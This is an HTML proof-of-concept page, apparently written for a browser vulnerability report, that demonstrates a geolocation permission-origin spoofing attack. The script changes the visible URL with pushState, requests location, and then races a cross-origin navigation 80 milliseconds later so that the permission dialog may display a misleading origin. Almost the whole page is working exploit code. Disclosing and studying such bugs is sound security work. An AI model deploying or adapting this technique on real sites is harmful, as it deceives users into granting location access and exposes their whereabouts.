<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Geolocation Origin Desync PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, system-ui;
  background: #f5f5f7;
}

button {
  font-size: 15px;
  padding: 10px 14px;
  border-radius: 10px;
  border: none;
  background: #007aff;
  color: #fff;
}

#panel {
  display: none;
  max-width: 420px;
  margin: 80px auto;
  background: #fff;
  padding: 24px;
  border-radius: 16px;
  box-shadow: 0 20px 60px rgba(0,0,0,.2);
  text-align: center;
}

.notice {
  margin-top: 14px;
  font-size: 13px;
  color: #b00020;
}

#status {
  font-size: 13px;
  margin-top: 10px;
  color: #444;
  word-break: break-word;
}
</style>
</head>

<body>

<div style="text-align:center; margin-top:60px;">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>Request Location</h2>
  <p>Tap the button below to request Geolocation permission.</p>

  <button id="geoBtn">Get Location</button>

  <p id="status">Status: idle</p>
  <p id="output">Location: -</p>

  <div class="notice">
    Demo only — observe origin shown in permission dialog
  </div>
</div>

<script>
const panel   = document.getElementById('panel');
const trigger = document.getElementById('trigger');
const output  = document.getElementById('output');
const status  = document.getElementById('status');
const geoBtn  = document.getElementById('geoBtn');

let navigationScheduled = false;

/*
 * Step 1:
 * Manipulate visible URL to a trusted-looking path
 */
trigger.onclick = () => {
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';
  status.textContent = 'Status: URL changed via pushState()';
};

/*
 * Step 2:
 * Trigger permission request, then race navigation
 */
geoBtn.onclick = () => {
  if (!navigator.geolocation) {
    status.textContent = 'Geolocation not supported';
    return;
  }

  status.textContent = 'Status: requesting geolocation permission…';

  navigator.geolocation.getCurrentPosition(
    pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;

      const mapUrl = `https://maps.google.com/?q=${lat},${lon}`;

      output.innerHTML = `
        Latitude: ${lat}<br>
        Longitude: ${lon}<br>
        <a href="${mapUrl}" target="_blank">View on Google Maps</a>
      `;

      status.textContent = 'Status: location received';
    },
    err => {
      status.textContent = 'Status: permission denied';
      output.textContent = err.message;
    }
  );

  // Schedule cross‑origin navigation shortly after permission flow starts
  if (!navigationScheduled) {
    navigationScheduled = true;

    setTimeout(() => {
      status.textContent = 'Status: navigating cross-origin…';
      location.href = 'https://google.com:9090';
    }, 80);
  }
};
</script>

</body>
</html>
